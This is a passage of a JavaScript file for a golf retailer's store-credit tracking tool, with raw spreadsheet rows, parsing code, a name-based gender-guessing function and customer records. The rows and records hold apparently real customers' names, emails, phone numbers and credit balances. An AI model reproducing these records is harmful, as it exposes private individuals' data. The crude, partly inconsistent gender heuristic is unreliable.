Over 30 Days	7/5/2025	7/5/2025	504009013	Charles	Cheon	(blank)	null@shaw.ca	5872278949	13.65	PROCESSED															
Over 30 Days	7/19/2025	9/4/2025	904039446	Audra	Ford	(blank)	audra.rawlinson@gmail.com	4038628278	104.99	PROCESSED															
Over 30 Days	8/6/2025	8/6/2025	906025769	Jugaansan 	Thayalan	Tamil Golfers Network	(blank)	6473393927	140.11	KEEP															
Over 30 Days	10/4/2025	11/15/2025	27683775	Kevin	Taillefer	(blank)	KEVIN.TAILLEFER@ALTUSENERGY.COM	4036892171	543.89	KEEP															
Over 30 Days	10/14/2025	10/14/2025	4036379	Ron	Kellam	(blank)	RGKELLAM@HUGHES.NET	4032575454	524.99	KEEP 															
Over 30 Days	10/23/2025	10/23/2025	888149826	Derrick	Williams	(blank)	(blank)	4034651191	62.99	PROCESSED															
Over 30 Days	11/8/2025	11/8/2025	904001651	rachael	bradley	(blank)	(blank)	4037020188	157.5	PROCESSED															
Over 30 Days	11/29/2025	11/29/2025	504004602	Aaron	Lawrick	(blank)	air_law@hotmail.com	5872242886	1,547.27	KEEP 															
Over 30 Days	12/5/2025	12/5/2025	924008764	Kyle	Freudenberger	(blank)	kyfreudenberger@gmail.com	5872252039	787.47	KEEP															
																									
																									
																									
Quarter 1 (2026)																									
Store Credit Aging	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS			Approved by (Full Name)													
Over 30 Days	5/16/2024	904029437	Raymond	mcguines	raymondmcguineswb@gmail.com	5878999094	251.99	KEEP																	
Over 30 Days	10/14/2025	4036379	Ron	Kellam	RGKELLAM@HUGHES.NET	4032575454	524.99	KEEP																	
Over 30 Days	12/11/2025	918013758	Lea	Lopez	(blank)	2048912795	2,099.99	KEEP																	
Over 30 Days	1/12/2026	904041515	JJ	Williams	(blank)	4038036636	1,799.95	PROCESSED																	
Over 30 Days	2/7/2026	904032605	Dallas	Touchette	dallastouchette1010@gmail.com	4039736158	276.28	KEEP																	
Over 30 Days	2/7/2026	937022120	Dillon	Meier	(blank)	4039886736	233.14	KEEP																	
Over 30 Days	2/7/2026	504000249	Larry	Smith	larry13@telus.net	4032814413	183.12	KEEP																	
Over 30 Days	2/7/2026	4045894	Dave	Giles	DAVEGILES1974@GMAIL.COM	4033338426	198.24	KEEP																	
Over 30 Days	2/7/2026	4061522	Calvin	Metcalf	calvin_metcalf@hotmail.com	5878300154	233.14	KEEP																	
Over 30 Days	2/7/2026	27683600	JEFF	Macdonald	JEFF@SUREFIREINDUSTRIES.CA	4032009869	212.39	KEEP 																	
Over 30 Days	2/7/2026	37122374	MIKE	POLITESKI	(blank)	4038180356	84.63	KEEP																	
Over 30 Days	2/11/2026	904041710	Marty	Kluck	klukmak@shaw.ca	(blank)	248.85	KEEP																	
Over 30 Days	2/11/2026	927012717	Fred	KWAN	(blank)	4039236899	661.43	PROCESSED																	
Over 30 Days	2/13/2026	904027036	Rees	matzner	reesmatzner@gmail.com	4039997292	5.49	REMOVE																	
Over 30 Days	2/21/2026	41013488	Reid	Nesbitt	reid_85@telus.net	4033701250	292.5	KEEP 																	
Over 30 Days	2/27/2026	504004602	aaron	Lawrick	air_law@hotmail.com	5872242886	1,547.27	KEEP 																	
Over 30 Days	2/27/2026	924008764	Kyle	Freudenberger	kyfreudenberger@gmail.com	5872252039	524.98	KEEP																	
Over 30 Days	3/2/2026	888580122	Rick	Woo	rycwoo@shaw.ca	4038154093	197.94	KEEP																	
Over 30 Days	3/5/2026	904004465	BRIAN	ziegler	(blank)	4038071152	346.49	KEEP																	
Over 30 Days	3/11/2026	945025469	pamela	mang	(blank)	4038708998	140.16	KEEP																	
Over 30 Days	3/11/2026	904037160	sam	jack	(blank)	4037712327	31.5	KEEP																	
Over 30 Days	3/11/2026	37119613	DANNY	FACH	DANNY.FACH@LIVE.COM	4036804824	545.99	KEEP																	
Over 30 Days	3/12/2026	927021614	Chris	Collins	chrisbobcollins@gmail.com	4038695160	2,047.49	KEEP 																	
Over 30 Days	3/13/2026	937024975	Joe	Healy	(blank)	4036349119	262.5	KEEP																	
Over 30 Days	3/13/2026	504009237	Bradley 	Bernardo	bernadobj@gmail.com	4036905748	562.79	KEEP																	
Over 30 Days	3/14/2026	904036197	Adam	TAYLOR	(blank)	5878970070	472.49	KEEP																	
Over 30 Days	3/14/2026	904041942	Alistair	robin	(blank)	4038306866	1,259.98	KEEP																	
Over 30 Days	3/14/2026	527006546	James	Pelzer	pelzer4@hotmail.com	4037970674	521.84	KEEP																	
Over 30 Days	3/14/2026	41015024	Kyle	Key	KKEY@SHAW.CA	4033072751	564.89	KEEP																	
Over 30 Days	3/14/2026	936001146	Chandler	Bruyckere	(blank)	2502402057	810.6	PROCESSED																	
Over 30 Days	3/15/2026	27694527	Brad	WATSON	BRADWATSON865@GMAIL.COM	4038037140	173.25	KEEP 																	
																									
																									
Quarter 2 (2026)																									
Store Credit Aging	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS																
Over 30 Days	2/7/2026	937022120	Dillon	Meier	(blank)	4039886736	233.14	KEEP																	
Over 30 Days	2/7/2026	27683600	Jeff	MacDonald	JEFF@SUREFIREINDUSTRIES.CA	4032009869	212.39	KEEP																	
Over 30 Days	2/7/2026	37122374	Mike	POLITESKI	(blank)	4038180356	84.63	KEEP																	
Over 30 Days	2/11/2026	904041710	Marty	Kluck	klukmak@shaw.ca	(blank)	248.85	KEEP																	
Over 30 Days	3/20/2026	904032605	Dallas	Touchette	dallastouchette1010@gmail.com	4039736158	276.28	KEEP																	
Over 30 Days	4/3/2026	4045894	dave	Giles	DAVEGILES1974@GMAIL.COM	4033338426	198.24	KEEP																	
Over 30 Days	4/19/2026	37114212	Rick	Mazurkewich	RICK.MAZURKEWICH@GMAIL.COM	5879987202	251.99	KEEP																	
Over 30 Days	5/12/2026	904042544	dave 	sutherland 	(blank)	4037718301	40	REMOVE																	
Over 30 Days	5/19/2026	27690836	Kevin	FRENCH	KEVINFRENCH22@HOTMAIL.COM	4036068593	157.5	PROCESSED																	
Over 30 Days	5/22/2026	999100091	Corporate	Account	(blank)	4509260110	287.44	KEEP 																	
Over 30 Days	5/23/2026	904042163	Josh	Logel	joshlogel@gmail.com	4038161417	732.89	KEEP																	
Over 30 Days	5/23/2026	904043170	Brad	hunter	(blank)	4036049062	115.48	PROCESSED																	
Over 30 Days	5/27/2026	904007496	Ross	Bentley	(blank)	4035128895	1,679.99	PROCESSED																	
Over 30 Days	5/29/2026	953007983	Bob	Leaf	(blank)	5877849098	713.99	PROCESSED																	
Over 30 Days	5/30/2026	41013488	Reid	Nesbitt	reid_85@telus.net	4033701250	292.5	KEEP																	
Over 30 Days	5/30/2026	904033349	Zeke	Parreno	(blank)	5875862800	20	KEEP																	
Over 30 Days	6/2/2026	29673299	Lloyd	gauthier	gauthier@gmail.com	2508886136	87.23	KEEP 																	
Over 30 Days	6/4/2026	904005725	Marylynn	Breitman	(blank)	4039995349	62.98	PROCESSED																	
Over 30 Days	6/5/2026	904014127	Tom	Brummelhuis	(blank)	4034220157	188.99	PROCESSED																	
Over 30 Days	6/8/2026	904007960	greg	Lefbvre	(blank)	4036066068	818.97	KEEP																	
Over 30 Days	6/10/2026	4061522	Calvin	Metcalf	calvin_metcalf@hotmail.com	5878300154	233.14	KEEP 																	
Over 30 Days	6/10/2026	924008764	Kyle	Freudenberger	kyfreudenberger@gmail.com	5872252039	524.98	KEEP																	
Over 30 Days	6/11/2026	904043361	Alex	elichlietner	(blank)	4038086468	1,559.96	PROCESSED																	
Over 30 Days	6/18/2026	504000249	Larry	Smith	larry13@telus.net	4032814413	183.12	KEEP																	
Over 30 Days	6/25/2025	904029437	raymond	mcguines	raymondmcguineswb@gmail.com	5878999094	251.99	KEEP 																	
Over 30 Days	7/2/2026	37113331	James	Schroeder	SCHROEDERJ@TELUSBLACKBERRY.NET	4036517227	2,204.99	PROCESSED																	
Over 30 Days	7/11/2026	4039172	Ian	Stroet	GOLF_GOD13@HOTMAIL.COM	4039219568	118.65	KEEP																	
Over 30 Days	8/6/2025	906025769	Jugaansan 	Thayalan	(blank)	6473393927	140.11	KEEP 																	
Over 30 Days	10/14/2025	4036379	Ron	Kellam	RGKELLAM@HUGHES.NET	4032575454	524.99	KEEP 																	
Over 30 Days	12/16/2025	918013758	Lea	Lopez	(blank)	2048912795	2,099.99	KEEP 																	`;
function parseStore504Data() {
  const lines = STORE_504_RAW_TEXT.split("\n");
  const records = [];
  let currentQuarter = "Q1";
  let currentYear = 2021;
  let currentQuarterYearKey = "2021-Q1";
  let colMap = {};
  for (let i = 0; i < lines.length; i++) {
    const rawLine = lines[i].trim();
    if (!rawLine || rawLine.includes("(OLDER PERIODS HIDDEN)")) continue;
    const quarterMatch = rawLine.match(/Quarter\s*(\d)\s*\(?(\d{4})?\)?/i);
    if (quarterMatch) {
      currentQuarter = `Q${quarterMatch[1]}`;
      if (quarterMatch[2]) {
        currentYear = parseInt(quarterMatch[2], 10);
      } else {
        currentYear = 2021;
      }
      currentQuarterYearKey = `${currentYear}-${currentQuarter}`;
      colMap = {};
      continue;
    }
    const cols = rawLine.split("	").map((c) => c.trim());
    const parsed = parseRowWithSmartAlignment(cols, colMap, "Calgary");
    if (parsed.isHeader && parsed.newColIndexes) {
      colMap = parsed.newColIndexes;
      continue;
    }
    if (!parsed.parsedFields) continue;
    const {
      rawCustId,
      firstName,
      lastName,
      company,
      email,
      phone,
      city,
      balanceNum,
      comments,
      keepOrRemove,
      createdDate,
      saleDate,
      aging
    } = parsed.parsedFields;
    if (!firstName && !lastName && !rawCustId) continue;
    const guessed = guessGender(firstName);
    records.push({
      id: `504-${currentQuarterYearKey}-${records.length + 1}-${Math.random().toString(36).substr(2, 4)}`,
      storeId: "504",
      storeName: "Store 504 - South Calgary Golf Town",
      quarter: currentQuarter,
      year: currentYear,
      quarterYearKey: currentQuarterYearKey,
      city: city || "Calgary",
      storeCreditAging: aging || "Over 30 Days",
      lastCreatedDate: createdDate,
      lastSaleDate: saleDate,
      custId: rawCustId,
      firstName,
      lastName,
      company: company || "",
      email: email || "",
      phone: phone || "(403) 723-0100",
      sumOfStoreCreditBalance: balanceNum,
      keepOrRemove: keepOrRemove || "keep",
      comments: comments || "",
      approvedBy: "",
      gender: guessed.gender,
      genderConfidence: guessed.confidence
    });
  }
  return sanitizeCustomerRecords(records);
}
var STORE_504_CUSTOMERS = parseStore504Data();

// src/data/initialData.ts
function guessGender(firstName) {
  if (!firstName) return { gender: "Unknown", confidence: 0.5 };
  const clean = firstName.trim().toLowerCase();
  const femaleNames = [
    "carina",
    "sandy",
    "mary",
    "jennifer",
    "lisa",
    "sarah",
    "jessica",
    "emily",
    "amanda",
    "elizabeth",
    "taylor",
    "ashley",
    "michelle",
    "karen",
    "linda",
    "patricia",
    "barbara",
    "susan",
    "jess",
    "rachel",
    "ash",
    "nicole",
    "stephanie",
    "lauren",
    "rebecca",
    "kelly",
    "kim",
    "amy",
    "angela",
    "brenda",
    "emma",
    "donna",
    "ursula",
    "agatha",
    "kristen",
    "colleen",
    "janet",
    "samantha",
    "michelle",
    "sylvia",
    "christene",
    "judy",
    "alyssa",
    "sadie",
    "jennifer",
    "mareli",
    "mary",
    "donna",
    "roby",
    "robyn",
    "mijung",
    "hollie",
    "oriana",
    "lana",
    "melonie",
    "jenna"
  ];
  const maleNames = [
    "mark",
    "robert",
    "aaron",
    "rod",
    "jim",
    "peter",
    "kevin",
    "gurmeet",
    "ben",
    "markus",
    "michael",
    "clay",
    "chris",
    "cam",
    "grady",
    "jack",
    "douglas",
    "glen",
    "bryce",
    "raoul",
    "eddie",
    "ross",
    "nguyen",
    "john",
    "david",
    "james",
    "william",
    "richard",
    "thomas",
    "charles",
    "joseph",
    "daniel",
    "paul",
    "brian",
    "ronald",
    "anthony",
    "jason",
    "jeffrey",
    "ryan",
    "gary",
    "nicholas",
    "eric",
    "stephen",
    "andrew",
    "joshua",
    "kenneth",
    "mervin",
    "egbert",
    "dexter",
    "jeff",
    "sam",
    "angelo",
    "jerry",
    "josh",
    "brandan",
    "ian",
    "dean",
    "greg",
    "jance",
    "scott",
    "sean",
    "alex",
    "zack",
    "darcy",
    "bryan",
    "ming",
    "jordan",
    "manny",
    "dan",
    "ralph",
    "derek",
    "darren",
    "stan",
    "randy",
    "brent",
    "phil",
    "vernon",
    "rolan",
    "rick",
    "matt",
    "devin",
    "jamie",
    "colleen",
    "hyo",
    "jacques",
    "jimmy",
    "kyoung",
    "cole",
    "darin",
    "sung",
    "leo",
    "john",
    "darrell",
    "kieran",
    "marvin",
    "shan",
    "emilio",
    "casper",
    "trevor",
    "jae",
    "navjit",
    "lloyd",
    "graydon",
    "rafe",
    "steven",
    "sandeep",
    "linden",
    "noah",
    "bruce",
    "darwin",
    "graham",
    "mike",
    "sejun",
    "craig",
    "wade",
    "bernie",
    "gordon",
    "artie",
    "doug",
    "brydon",
    "steve",
    "ken",
    "tyler",
    "wolf",
    "luc",
    "kelly",
    "neil",
    "brandon",
    "connor",
    "shawn",
    "blair",
    "dale",
    "herb",
    "herb",
    "travis",
    "matthew",
    "taeryong",
    "colby",
    "toshi",
    "colin",
    "chad",
    "terry",
    "grant",
    "seungwon",
    "jarrett",
    "horace",
    "logan",
    "justin",
    "brad",
    "jacob",
    "chris",
    "raphael",
    "forest",
    "jermey",
    "josh",
    "michel",
    "tony",
    "gord",
    "parker",
    "dulcie",
    "raj",
    "jin",
    "fabien",
    "dave",
    "robin",
    "james",
    "eli",
    "jarred",
    "nathan",
    "christian",
    "stephane",
    "thomas",
    "amer",
    "nelson",
    "mike",
    "kyle",
    "harry"
  ];
  if (femaleNames.includes(clean)) {
    return { gender: "Female", confidence: 0.95 };
  }
  if (maleNames.includes(clean)) {
    return { gender: "Male", confidence: 0.95 };
  }
  if (["a", "i", "ine", "elle", "ia"].some((suffix) => clean.endsWith(suffix)) && clean.length > 3) {
    if (["luca", "elija", "ezra", "micah", "dakota", "mervin"].includes(clean)) {
      return { gender: "Male", confidence: 0.7 };
    }
    return { gender: "Female", confidence: 0.65 };
  }
  return { gender: "Unknown", confidence: 0.4 };
}
var STORE_505_CUSTOMERS = [
  // --- 2026 Q2 ---
  { id: "505-2026-q2-1", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "1/1/2026", lastSaleDate: "1/1/2026", custId: "905014716", firstName: "James", lastName: "Mcdade", company: "", email: "jamesrobertmcdade@gmail.com", phone: "7809352417", sumOfStoreCreditBalance: 209.98, keepOrRemove: "keep", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2026-q2-2", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "1/17/2026", lastSaleDate: "1/17/2026", custId: "888033566", firstName: "Douglas", lastName: "Chonko", company: "", email: "DCHONKO@SHAW.CA", phone: "7806372255", sumOfStoreCreditBalance: 15.57, keepOrRemove: "keep", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2026-q2-3", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "2/9/2025", lastSaleDate: "2/9/2025", custId: "923004497", firstName: "Chris", lastName: "Lakusta", company: "Alberta Honda", email: "", phone: "7804748595", sumOfStoreCreditBalance: 210, keepOrRemove: "keep - corp", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.9 },
  { id: "505-2026-q2-4", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/20/2026", lastSaleDate: "3/20/2026", custId: "5109371", firstName: "Robert", lastName: "Sharpe", company: "", email: "rsharpe2260@icloud.com", phone: "7806225646", sumOfStoreCreditBalance: 142.8, keepOrRemove: "remove", comments: "processed", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2026-q2-5", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/25/2026", lastSaleDate: "3/25/2026", custId: "905007266", firstName: "Matt", lastName: "Adams", company: "", email: "", phone: "7808069329", sumOfStoreCreditBalance: 222.59, keepOrRemove: "keep", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2026-q2-6", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "4/14/2026", lastSaleDate: "4/14/2026", custId: "888161466", firstName: "Jim", lastName: "Toller", company: "", email: "JMTOLLER@SHAW.CA", phone: "7802351357", sumOfStoreCreditBalance: 73.5, keepOrRemove: "keep", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2026-q2-7", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "4/25/2026", lastSaleDate: "4/25/2026", custId: "905011392", firstName: "Mitchell", lastName: "Adams", company: "", email: "mitchelladams@me.com", phone: "7809919922", sumOfStoreCreditBalance: 2028.14, keepOrRemove: "keep - corp", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2026-q2-8", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "5/7/2026", lastSaleDate: "5/7/2026", custId: "905013912", firstName: "Alyssa", lastName: "Mahoney", company: "", email: "alyssamariemahoney@icloud.com", phone: "7807772052", sumOfStoreCreditBalance: 1404.95, keepOrRemove: "keep", comments: "father gave 5k as gift", approvedBy: "", gender: "Female", genderConfidence: 0.95 },
  { id: "505-2026-q2-9", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "5/13/2026", lastSaleDate: "5/13/2026", custId: "5107510", firstName: "Taeryong", lastName: "Park", company: "", email: "PARKTAERYONG@GMAIL.COM", phone: "7807928806", sumOfStoreCreditBalance: 1003.66, keepOrRemove: "keep - corp", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.9 },
  { id: "505-2026-q2-10", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "6/9/2026", lastSaleDate: "6/9/2026", custId: "18255014", firstName: "Mike", lastName: "Verhoski", company: "", email: "mverhoski@morguard.com", phone: "7804241642", sumOfStoreCreditBalance: 5184.37, keepOrRemove: "keep - corp", comments: "most used", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2026-q2-11", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "6/21/2026", lastSaleDate: "6/21/2026", custId: "505000681", firstName: "Leo", lastName: "Provencher", company: "", email: "leo@titanhauling.com", phone: "7809919200", sumOfStoreCreditBalance: 44.11, keepOrRemove: "keep - corp", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2026-q2-12", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "6/22/2026", lastSaleDate: "6/22/2026", custId: "905033460", firstName: "Jin", lastName: "Kim", company: "", email: "jinbeom@ualberta.ca", phone: "7807818239", sumOfStoreCreditBalance: 157.58, keepOrRemove: "keep", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.9 },
  { id: "505-2026-q2-13", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q2", year: 2026, quarterYearKey: "2026-Q2", storeCreditAging: "Over 30 Days", lastCreatedDate: "7/7/2026", lastSaleDate: "7/7/2026", custId: "905012216", firstName: "Matthew", lastName: "Leclaire", company: "", email: "southedmonton@golftown.com", phone: "7808870557", sumOfStoreCreditBalance: 127.05, keepOrRemove: "keep", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  // --- 2024 Q1 (LO's initial provided block) ---
  { id: "505-2024-q1-1", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/9/2018", lastSaleDate: "4/12/2024", custId: "888817759", firstName: "Mark", lastName: "Edwards", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 799.99, keepOrRemove: "no credit", comments: "redeemed", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-2", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "1/28/2022", lastSaleDate: "3/2/2024", custId: "5109371", firstName: "Robert", lastName: "Sharpe", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 142.8, keepOrRemove: "keep", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-3", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/22/2022", lastSaleDate: "4/11/2024", custId: "541008587", firstName: "Aaron", lastName: "Gill", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 194.25, keepOrRemove: "keep", comments: "has not arrived", approvedBy: "", gender: "Male", genderConfidence: 0.98 },
  { id: "505-2024-q1-4", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "4/20/2022", lastSaleDate: "4/17/2024", custId: "905008243", firstName: "rod", lastName: "silva", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 2320.42, keepOrRemove: "keep", comments: "$209.99 remaining", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2024-q1-5", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/23/2023", lastSaleDate: "4/11/2024", custId: "23377696", firstName: "Sandy", lastName: "MACLELLAN", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 936.59, keepOrRemove: "keep", comments: "has not arrived", approvedBy: "", gender: "Male", genderConfidence: 0.8 },
  { id: "505-2024-q1-6", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "7/2/2023", lastSaleDate: "1/20/2024", custId: "5090030", firstName: "Jim", lastName: "Nicholson", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 62.99, keepOrRemove: "no credit", comments: "redeemed", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-7", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "7/2/2023", lastSaleDate: "4/12/2024", custId: "905016893", firstName: "Peter", lastName: "Cho", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 737.21, keepOrRemove: "keep", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-8", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "7/7/2023", lastSaleDate: "4/14/2024", custId: "505001116", firstName: "Kevin", lastName: "Kennedy", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 680.27, keepOrRemove: "keep", comments: "has not arrived", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-9", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "8/21/2023", lastSaleDate: "4/3/2024", custId: "23378826", firstName: "NGUYEN", lastName: "PHAM", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 214.2, keepOrRemove: "no credit", comments: "redeemed", approvedBy: "", gender: "Unknown", genderConfidence: 0.5 },
  { id: "505-2024-q1-10", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "11/2/2023", lastSaleDate: "4/4/2024", custId: "905022048", firstName: "Gurmeet", lastName: "Gurm", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 708.75, keepOrRemove: "keep", comments: "corp", approvedBy: "", gender: "Male", genderConfidence: 0.85 },
  { id: "505-2024-q1-11", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "12/9/2023", lastSaleDate: "4/17/2024", custId: "905016658", firstName: "Ben", lastName: "Seinen", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 243.59, keepOrRemove: "no credit", comments: "redeemed", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-12", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "12/28/2023", lastSaleDate: "12/28/2023", custId: "905011670", firstName: "Markus", lastName: "Breitkreuz", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 1561.82, keepOrRemove: "keep", comments: "delay from callaway", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-13", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "2/12/2024", lastSaleDate: "4/15/2024", custId: "905028231", firstName: "Michael", lastName: "bottcher", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 1652.96, keepOrRemove: "no credit", comments: "redeemed", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-14", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "2/22/2024", lastSaleDate: "2/22/2024", custId: "553003409", firstName: "Carina", lastName: "Chan", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 1165.5, keepOrRemove: "no credit", comments: "redeemed", approvedBy: "", gender: "Female", genderConfidence: 0.99 },
  { id: "505-2024-q1-15", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/5/2024", lastSaleDate: "3/5/2024", custId: "905021907", firstName: "Clay", lastName: "Subanovich", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 12.6, keepOrRemove: "keep", comments: "customer has credit from previous order", approvedBy: "", gender: "Male", genderConfidence: 0.95 },
  { id: "505-2024-q1-16", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/9/2024", lastSaleDate: "3/9/2024", custId: "960008686", firstName: "Mark", lastName: "Klopoushak", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 629.99, keepOrRemove: "no credit", comments: "redeemed", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-17", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/13/2024", lastSaleDate: "3/13/2024", custId: "5103717", firstName: "Chris", lastName: "ible", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 839.99, keepOrRemove: "no credit", comments: "redeemed", approvedBy: "", gender: "Male", genderConfidence: 0.85 },
  { id: "505-2024-q1-18", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/19/2024", lastSaleDate: "3/19/2024", custId: "905029277", firstName: "Cam", lastName: "Penner", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 413.16, keepOrRemove: "no credit", comments: "redeemed", approvedBy: "", gender: "Male", genderConfidence: 0.9 },
